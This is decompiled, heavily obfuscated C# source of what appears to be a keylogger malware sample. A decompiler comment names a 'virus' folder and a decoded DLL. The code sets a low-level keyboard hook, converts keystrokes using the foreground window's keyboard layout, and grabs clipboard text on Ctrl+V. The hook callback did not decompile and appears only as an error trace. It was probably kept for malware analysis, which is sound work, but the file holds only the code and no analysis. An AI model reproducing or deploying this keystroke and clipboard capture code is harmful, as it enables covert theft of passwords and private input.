using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class ________________________________________
{
	private static int ____;

	private static ________________________________________.__________________________________________ _____;

	public ________________________________________()
	{
	}

	public void ______________()
	{
		try
		{
			________________________________________ _____________________ = this;
			________________________________________._____ = new ________________________________________.__________________________________________(_____________________._______________);
			________________________________________.____ = ________________________________________.SetWindowsHookExA(13, ________________________________________._____, (int)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);
			if (________________________________________.____ == 0)
			{
				IntPtr num = (IntPtr)Conversions.ToLong(Environment.GetCommandLineArgs()[1]);
				________________________________________ _____________________1 = this;
				________________________________________._____ = new ________________________________________.__________________________________________(_____________________1._______________);
				________________________________________.____ = ________________________________________.SetWindowsHookExA(13, ________________________________________._____, (int)num, 0);
			}
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	private int _______________(int int_0, int int_1, ref ________________________________________._________________________________________ __________________________________________0)
	{
		// 
		// Current member / type: System.Int32 ________________________________________::_______________(System.Int32,System.Int32,________________________________________/_________________________________________&)
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Int32 _______________(System.Int32,System.Int32,________________________________________/_________________________________________&)
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public string ________________(Keys keys_0)
	{
		unsafe
		{
			int num = 0;
			Keys keys0 = (Keys)0;
			int num1 = 0;
			int ______ = 0;
			int ________ = 0;
			int _________ = 0;
			char chr;
			string lower = null;
			int length;
			object obj;
			int length1;
			bool shiftKeyDown = false;
			try
			{
				if (-7570 != Type.EmptyTypes.Length + -7571)
				{
				Label14:
					shiftKeyDown = C.bzA.Keyboard.ShiftKeyDown;
					if (!C.bzA.Keyboard.CapsLock)
					{
						goto Label1;
					}
					length = 23401;
					if (sizeof(short) + 8684 == 8686)
					{
						goto Label2;
					}
					return lower;
				}
			}
			catch (Exception exception1)
			{
				ProjectData.SetProjectError(exception1);
				try
				{
					if (!shiftKeyDown)
					{
						chr = Strings.ChrW((int)keys_0);
						lower = chr.ToString().ToLower();
						ProjectData.ClearProjectError();
					}
					else
					{
						chr = Strings.ChrW((int)keys_0);
						lower = chr.ToString().ToUpper();
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					lower = null;
					ProjectData.ClearProjectError();
				}
			}
			return lower;
		Label1:
			length = 30402;
			if (!C.bzA.Keyboard.CtrlKeyDown)
			{
				goto Label3;
			}
			if (keys_0 == Keys.V)
			{
				if (length == -1942)
				{
					return lower;
				}
				lower = C.bzA.Clipboard.GetText();
				return lower;
			}
			lower = null;
			obj = Type.EmptyTypes.Length + 4;
		Label12:
			while (true)
			{
			Label11:
				switch (obj)
				{
					case 0:
					{
						lower = <Module>.___<string>(1199096694);
						return lower;
					}
					case 1:
					{
						do
						{
							if (keys0 == Keys.ControlKey)
							{
								goto Label9;
							}
							if (keys0 == Keys.RControlKey || keys0 == Keys.LControlKey)
							{
								goto Label9;
							}
							if (length != -11143)
							{
								lower = C.bzA.Clipboard.GetText();
								return lower;
							}
							else if (8 * num1 - 4701 + 649579720 == -num1 << 3)
							{
								lower = C.bzA.Clipboard.GetText();
								return lower;
							}
							else if (keys0 == Keys.Alt)
							{
								goto Label9;
							}
							else if (keys0 != Keys.Space)
							{
								if (keys0 != Keys.Back)
								{
									if (keys0 == Keys.Return)
									{
										goto Label10;
									}
									obj = Type.EmptyTypes.Length + 3;
									goto Label11;
								}
								else
								{
									length = 32260;
								}
							}
							else if ((-(-1358080 * ________) >> 8 & 1) != (1 & ________))
							{
								obj = sizeof(ulong) + 913001722;
								goto Label11;
							}
							else if ((151 & -1390 + num * 16 + 1008 * num) != 146)
							{
								obj = sizeof(ushort) + 1743121200;
								goto Label11;
							}
							else
							{
								obj = sizeof(ushort) + -2;
								goto Label11;
							}
						}
						while (Type.EmptyTypes.Length + -12443 == -9535);
						break;
					}
					case 2:
					{
						if (keys0 == Keys.Shift || keys0 == Keys.ShiftKey || keys0 == Keys.Control)
						{
							goto Label9;
						}
						length = Type.EmptyTypes.Length + -11143;
						obj = Type.EmptyTypes.Length + 1;
						continue;
					}
					case 3:
					{
						if (keys0 == Keys.Return)
						{
							goto Label10;
						}
						else if (keys0 == Keys.Tab)
						{
							length = -22203;
							int ________1 = <Module>._______________;
							if ((~-(________1 * -1503395840) != 262144 * ________1 ? -474 : Type.EmptyTypes.Length + -1428370030) == 25251)
							{
								goto case 1;
							}
							if (_______________________________________.__ != keys_0)
							{
								lower = <Module>._____<string>(434313728);
								return lower;
							}
							else
							{
								lower = <Module>.__________(Type.EmptyTypes.Length + 50484, Type.EmptyTypes.Length + 50699, Type.EmptyTypes.Length + 242);
								if ((______ + ______ * 3 | -2) == -2)
								{
									if (length == -24067)
									{
										goto case 1;
									}
									return lower;
								}
								else
								{
									return lower;
								}
							}
						}
						else if (!shiftKeyDown)
						{
							lower = ________________________________________._________________((uint)keys_0);
							length = 2994;
							if (((6143 | _________) * 193 + (6143 | _________) * 831 != 7575 ? Type.EmptyTypes.Length + 28804 : Type.EmptyTypes.Length + -1264206385) == 22909)
							{
								break;
							}
							else
							{
								return lower;
							}
						}
						else
						{
							length = 28804;
							_________ = <Module>._________________;
							if ((-8874 | -(_________ << 18)) != -8874)
							{
								return lower;
							}
							lower = ________________________________________._________________((uint)keys_0).ToUpper();
							return lower;
						}
					}
					case 4:
					{
						return lower;
					}
					case 5:
					{
						if (keys0 == Keys.F12 || keys0 == Keys.End)
						{
							lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
							return lower;
						}
						if (keys0 != Keys.Delete)
						{
							if (keys0 == Keys.LShiftKey || keys0 == Keys.RShiftKey)
							{
								goto Label9;
							}
							obj = Type.EmptyTypes.Length + 2;
							continue;
						}
						else if (-87703552 * length != -1846826231)
						{
							if (length == -21893)
							{
								return lower;
							}
							lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
							return lower;
						}
						else
						{
							lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
							return lower;
						}
					}
					default:
					{
						return lower;
					}
				}
				lower = <Module>.______<string>(-2031932929);
				return lower;
			}
		Label9:
			int length2 = Type.EmptyTypes.Length + 4943;
			num1 = A.i0;
			if ((1 & num1 - 728 >> 2) != (1 & num1 / 4))
			{
				________ = <Module>.______________;
				if ((6144 & ________ / 16 & (________ / 5398644 ^ 8668)) != 0)
				{
					length1 = -759032824;
				}
				else if (num1 * 392276584 == 1227611933)
				{
					length1 = Type.EmptyTypes.Length + -1133953397;
				}
				else if ((num1 % 443397530 & -536870912) != 0)
				{
					length1 = (int)(sizeof(long) + -2050816193);
				}
				else
				{
					______ = <Module>.__________;
					length1 = ((6720 + (-5255 & ______) ^ -2033253166) != 0 ? 768007366 : (int)(sizeof(ushort) + 809641983));
				}
			}
			else
			{
				int num2 = A.i0;
				if ((1 & num2 + num2 + 2682) == 0)
				{
					length1 = (int)(sizeof(int) + 6178);
				}
				else
				{
					length1 = (-(______ << 30) == -1874483982 ? Type.EmptyTypes.Length + 838701997 : (int)(sizeof(float) + -611690294));
				}
			}
			lower = <Module>.__________(length2, length1, (~(num1 / 299630 % 2048) == -(num1 * 14476) * 262144 ? Type.EmptyTypes.Length + 1028596853 : checked((int)130)));
			return lower;
		Label2:
			if (!shiftKeyDown)
			{
				shiftKeyDown = true;
				length = 30402;
				if (Type.EmptyTypes.Length + 23401 == 23401)
				{
					goto Label1;
				}
			}
			else
			{
				shiftKeyDown = false;
				goto Label1;
			}
		Label15:
			if (keys0 != Keys.F6 && keys0 != Keys.F7 && keys0 != Keys.F8)
			{
				if (length == 5182)
				{
					if ((887 & ______ * 816128) == 0)
					{
						goto Label14;
					}
				}
				if (keys0 == Keys.F9 || keys0 == Keys.F10 || keys0 == Keys.F11)
				{
					lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
					return lower;
				}
				length = Type.EmptyTypes.Length + 31768;
				obj = Type.EmptyTypes.Length + 5;
				goto Label12;
			}
			lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
			return lower;
		Label3:
			keys0 = keys_0;
			if (keys0 != Keys.F1 && keys0 != Keys.F2)
			{
				length = -9029;
				if (((6144 & num1 / 16 & (num1 / 5398644 ^ 8668)) == 0 ? 5978 : Type.EmptyTypes.Length + -1471801026) != 420)
				{
					if (keys0 == Keys.F3 || keys0 == Keys.F4 || keys0 == Keys.F5)
					{
						lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
						return lower;
					}
					num = length;
					length = 31054;
					if (num == -9029)
					{
						goto Label15;
					}
					else
					{
						goto Label2;
					}
				}
				else
				{
					goto Label15;
				}
			}
			else
			{
				lower = <Module>.__________(checked((int)64471), 65289, Type.EmptyTypes.Length + 136);
				return lower;
			}
		Label10:
			if (_______________________________________.__ != keys_0)
			{
				lower = <Module>._______<string>(1043067638);
				return lower;
			}
			else
			{
				lower = <Module>.__________(Type.EmptyTypes.Length + 17383, 18083, Type.EmptyTypes.Length + 17);
				return lower;
			}
		}
	}

	private static string _________________(uint uint_0)
	{
		string str;
		uint num = 0;
		IntPtr foregroundWindow = default(IntPtr);
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] numArray = new byte[255];
			<Module>._____ = null;
			int _______ = <Module>.C;
			if (_______ / 1518670 - -536870912 != _______ / 1048576 * 256)
			{
				if (________________________________________.GetKeyboardState(numArray))
				{
					num = ________________________________________.MapVirtualKey(uint_0, 0);
					foregroundWindow = ________________________________________.GetForegroundWindow();
				}
				else
				{
					str = <Module>.__________(Type.EmptyTypes.Length + 27780, (int)(sizeof(byte) + 28334), 90);
					switch (sizeof(double))
					{
						case 7:
						{
							break;
						}
						default:
						{
							return str;
						}
					}
				}
			}
			int num1 = 0;
			int windowThreadProcessId = ________________________________________.GetWindowThreadProcessId(foregroundWindow, ref num1);
			IntPtr keyboardLayout = (IntPtr)________________________________________.GetKeyboardLayout(windowThreadProcessId);
			________________________________________.ToUnicodeEx(uint_0, num, numArray, stringBuilder, 5, 0, keyboardLayout);
			str = stringBuilder.ToString();
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
			return (Keys)uint_0.ToString();
		}
		return str;
	}

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern int CallNextHookEx(int int_0, int int_1, int int_2, ________________________________________._________________________________________ __________________________________________0);

	[DllImport("user32.dll", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern int GetKeyboardLayout(int int_0);

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("kernel32.dll", CharSet=CharSet.Auto, ExactSpelling=false, SetLastError=true)]
	private static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern int GetWindowTextA(int int_0, ref string string_0, int int_1);

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false, SetLastError=true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern int SetWindowsHookExA(int int_0, ________________________________________.__________________________________________ ___________________________________________0, int int_1, int int_2);

	[DllImport("user32.dll", CharSet=CharSet.None, ExactSpelling=false)]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out] StringBuilder stringBuilder_0, int int_0, uint uint_2, IntPtr intptr_0);

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	private static extern int UnhookWindowsHookEx(int int_0);

	public event ________________________________________.___________________________________________ _;

	public event ________________________________________.____________________________________________ __;

	public event ________________________________________._____________________________________________ ___;

	private struct _________________________________________
	{
		public int _;

		public int __;

		public int ___;

		public int ____;

		public int _____;
	}

	private delegate int __________________________________________(int int_0, int int_1, ref ________________________________________._________________________________________ __________________________________________0);

	public delegate void ___________________________________________(Keys keys_0);

	public delegate void ____________________________________________(Keys keys_0);

	public delegate void _____________________________________________(string string_0);
}